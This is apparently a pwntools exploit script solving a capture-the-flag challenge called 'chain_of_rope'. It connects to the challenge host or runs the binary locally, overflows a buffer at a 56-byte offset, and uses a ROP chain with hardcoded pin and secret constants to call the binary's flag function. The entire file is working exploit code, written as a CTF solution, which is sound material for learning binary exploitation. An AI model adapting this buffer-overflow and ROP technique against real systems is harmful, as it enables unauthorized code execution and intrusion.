from pwn import *
import sys


context.clear(arch='amd64')

argv = sys.argv
REMOTE = False
DEBUG = False
binary_path = './chain_of_rope'

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	sh = remote('shell.actf.co', 19306)
else:
	sh = process(binary_path)
	if DEBUG:
		gdb.attach(sh, '''
			b* main
			''')

e = ELF(binary_path)

def set_name(name):
	log.info('setting name')
	sh.sendlineafter('3 - Grant access', '1\n')
	sh.sendline(name)

# ----- plan ------
# gets on the global vars and
# rop to get flag with correcr args


overflow_offset = 56
pin = 0xba5eba11
secret = 0xbedabb1e
userToken = 0x1337
balance = 0x4242

rop = ROP(e)
rop.raw(0x000000000040101a) # ret;
rop.gets(e.sym['userToken'])
rop.flag(pin, secret)

payload = 'A' * overflow_offset + str(rop)

log.info('payload: {}'.format(payload))

set_name(payload)
sh.sendline(p32(userToken) + p32(balance)) # for gets

print sh.recvall()















